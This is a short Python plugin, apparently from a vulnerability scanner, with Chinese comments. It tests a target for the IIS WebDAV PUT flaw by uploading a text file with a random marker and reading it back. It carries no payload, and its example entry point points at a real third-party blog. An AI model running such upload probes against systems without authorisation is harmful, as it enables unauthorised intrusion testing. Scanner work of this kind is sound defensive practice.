#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class Iis_Webdav_Put_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'IIS webdav put漏洞',
            'description': 'IIS webdav put漏洞',
            'date': '2013-07-16',
            'exptype': 'check',
            'type': 'Info'
        }
        self.url = url
        self.headers = {
            "User-Agent": get_useragent()
        }
        self.capta = get_capta()

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        file_content = self.capta
        url = self.url + "/" + self.capta + ".txt"
        try:
            req = await request.put(url, data = {'test': self.capta}, headers = self.headers)
            req_get = await request.get(url, headers = self.headers)
            if req_get.status == 200 and file_content in req_get.text:
                # print('存在iis webdav put漏洞')
                return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    IIS_Webdav_Put = Iis_Webdav_Put_BaseVerify('https://blog.csdn.net')
    IIS_Webdav_Put.check()